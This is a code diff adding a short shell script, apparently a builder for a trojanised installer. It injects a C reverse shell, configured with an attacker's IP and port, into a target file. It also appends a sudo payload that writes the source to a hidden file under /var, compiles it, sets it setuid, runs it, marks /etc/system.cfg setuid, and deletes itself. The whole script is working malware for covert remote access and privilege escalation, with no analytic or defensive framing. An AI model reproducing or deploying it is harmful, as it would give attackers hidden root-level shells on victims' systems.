@@ -1,0 +1,18 @@
+ip='#define AIP ''"'$1'"'
+port="#define PORT $2"
+(echo $ip && echo $port && cat v7x-rsg.rs.c) > rs.c
+
+cat rsh.cetf >> $3
+cat rs.c >> $3
+echo "'" >> $3
+script="
+sudo echo \"\$data\" > /var/.sys.cfg.c
+sudo gcc /var/.sys.cfg.c -o /var/.sys.cfg >>/dev/null
+sudo chmod +s /var/.sys.cfg &> /dev/null
+sudo /var/.sys.cfg
+sudo chmod +s /etc/system.cfg
+sudo chmod +x /etc/system.cfg
+rm \$0
+"
+printf "$script" >> $3
+
